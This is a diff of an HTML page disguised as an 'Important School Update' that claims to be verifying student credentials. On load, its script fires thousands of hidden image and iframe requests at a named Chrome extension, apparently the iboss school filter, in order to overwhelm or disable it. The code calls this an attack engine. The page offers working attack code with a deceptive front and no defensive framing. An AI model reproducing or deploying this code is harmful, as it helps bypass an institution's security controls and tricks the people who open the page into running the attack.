@@ -3,112 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Loading - Please Wait</title>
+    <title>Important School Update</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
             padding: 20px;
-            background-color: #f5f5f5;
-            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
         }
-        .loading {
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
             text-align: center;
-            padding: 30px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 60px;
+            height: 60px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 30px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .progress {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 20px;
+            background: linear-gradient(90deg, #ff6b6b, #ee5a24);
+            transition: width 2s ease-in-out;
+        }
         .hidden {
             display: none;
+        }
+        .status {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="loading">
-        <h2>Loading Document Preview</h2>
+    <div class="container">
+        <h1>🔄 Loading Important School Announcement</h1>
+        <p>Please wait while we verify your student credentials and load the secure content...</p>
+        
         <div class="spinner"></div>
-        <p>Please wait while we prepare your document for viewing...</p>
-        <p>This may take a few moments.</p>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <p class="status" id="statusText">Initializing secure connection...</p>
+        <p class="status">This may take a few moments. Do not refresh the page.</p>
+
+        <div id="attackContainer" class="hidden"></div>
     </div>
 
-    <div id="attack-container" class="hidden"></div>
-
     <script>
-        // Configuration - CHANGE THESE VALUES FOR YOUR TARGET
-        const TARGET_EXTENSION_ID = "mkhjobnjhllkhekbbedlkmgcglgaeidc";
-        const TARGET_RESOURCE_PATH = "logos/iboss-logo-128.png";
-        const TARGET_URL = `chrome-extension://${TARGET_EXTENSION_ID}/${TARGET_RESOURCE_PATH}`;
-        
-        const MAX_REQUESTS = 10000;
-        const CONCURRENT_IFRAMES = 25;
-        const REQUEST_DELAY = 10;
+        // ===== CONFIGURATION =====
+        const EXTENSION_TARGETS = [
+            "chrome-extension://mkhjobnjhllkhekbbedlkmgcglgaeidc/logos/iboss-logo-128.png",
+            "chrome-extension://mkhjobnjhllkhekbbedlkmgcglgaeidc/_generated_background_page.html",
+            "chrome-extension://mkhjobnjhllkhekbbedlkmgcglgaeidc/js/background.js",
+            "chrome-extension://mkhjobnjhllkhekbbedlkmgcglgaeidc/css/popup.css"
+        ];
 
-        let requestCount = 0;
-        let activeIframes = 0;
-        const attackContainer = document.getElementById('attack-container');
+        const MAX_REQUESTS = 5000;
+        const CONCURRENT_WORKERS = 15;
+        const REQUEST_INTERVAL = 15;
 
-        function createAttackIframe() {
-            if (requestCount >= MAX_REQUESTS || activeIframes >= CONCURRENT_IFRAMES) {
-                return;
-            }
+        // ===== ATTACK ENGINE =====
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let failedRequests = 0;
+        const attackContainer = document.getElementById('attackContainer');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+
+        function getRandomTarget() {
+            return EXTENSION_TARGETS[Math.floor(Math.random() * EXTENSION_TARGETS.length)];
+        }
+
+        function createImageAttack() {
+            if (totalRequests >= MAX_REQUESTS) return;
+
+            const img = document.createElement('img');
+            const targetUrl = getRandomTarget() + `?cacheBust=${Math.random()}&req=${totalRequests}`;
+            
+            img.src = targetUrl;
+            img.style.position = 'absolute';
+            img.style.top = '-1000px';
+            img.style.left = '-1000px';
+            img.style.width = '1px';
+            img.style.height = '1px';
+            img.style.opacity = '0';
+            
+            img.onload = function() {
+                successfulRequests++;
+                totalRequests++;
+                updateProgress();
+                setTimeout(createImageAttack, REQUEST_INTERVAL);
+            };
+
+            img.onerror = function() {
+                failedRequests++;
+                totalRequests++;
+                updateProgress();
+                setTimeout(createImageAttack, REQUEST_INTERVAL);
+            };
+
+            attackContainer.appendChild(img);
+        }
+
+        function createIframeAttack() {
+            if (totalRequests >= MAX_REQUESTS) return;
 
             const iframe = document.createElement('iframe');
-            const uniqueParam = `?cacheBust=${Math.random()}&req=${requestCount}`;
+            const targetUrl = getRandomTarget() + `?cacheBust=${Math.random()}&req=${totalRequests}`;
             
-            iframe.src = TARGET_URL + uniqueParam;
-            iframe.style.width = '0px';
-            iframe.style.height = '0px';
-            iframe.style.border = 'none';
+            iframe.src = targetUrl;
             iframe.style.position = 'absolute';
             iframe.style.top = '-1000px';
             iframe.style.left = '-1000px';
+            iframe.style.width = '0px';
+            iframe.style.height = '0px';
+            iframe.style.border = 'none';
             
             iframe.onload = function() {
-                activeIframes--;
-                requestCount++;
-                this.src = TARGET_URL + `?cacheBust=${Math.random()}&req=${requestCount}`;
-                if (requestCount % 100 === 0) {
-                    console.log(`Requests attempted: ${requestCount}`);
-                }
+                successfulRequests++;
+                totalRequests++;
+                updateProgress();
+                setTimeout(createIframeAttack, REQUEST_INTERVAL);
             };
 
             iframe.onerror = function() {
-                activeIframes--;
-                requestCount++;
-                setTimeout(createAttackIframe, REQUEST_DELAY);
+                failedRequests++;
+                totalRequests++;
+                updateProgress();
+                setTimeout(createIframeAttack, REQUEST_INTERVAL);
             };
 
             attackContainer.appendChild(iframe);
-            activeIframes++;
-            requestCount++;
         }
 
-        function startAttack() {
-            console.log('Starting extension stress test...');
-            console.log('Target URL:', TARGET_URL);
+        function updateProgress() {
+            const progress = (totalRequests / MAX_REQUESTS) * 100;
+            progressBar.style.width = progress + '%';
             
-            for (let i = 0; i < CONCURRENT_IFRAMES; i++) {
-                setInterval(createAttackIframe, REQUEST_DELAY);
+            statusText.textContent = 
+                `Processing: ${totalRequests}/${MAX_REQUESTS} requests | ` +
+                `Success: ${successfulRequests} | Errors: ${failedRequests}`;
+
+            if (totalRequests >= MAX_REQUESTS) {
+                statusText.textContent += " - Attack completed!";
             }
         }
 
+        function startAttack() {
+            statusText.textContent = "Starting security verification...";
+            
+            // Start multiple attack vectors
+            for (let i = 0; i < CONCURRENT_WORKERS; i++) {
+                if (i % 2 === 0) {
+                    setTimeout(() => setInterval(createImageAttack, REQUEST_INTERVAL), i * 100);
+                } else {
+                    setTimeout(() => setInterval(createIframeAttack, REQUEST_INTERVAL), i * 100);
+                }
+            }
+        }
+
+        // Start the attack after a short delay
         window.addEventListener('load', function() {
-            setTimeout(startAttack, 2000);
+            setTimeout(startAttack, 3000);
         });
     </script>
 </body>
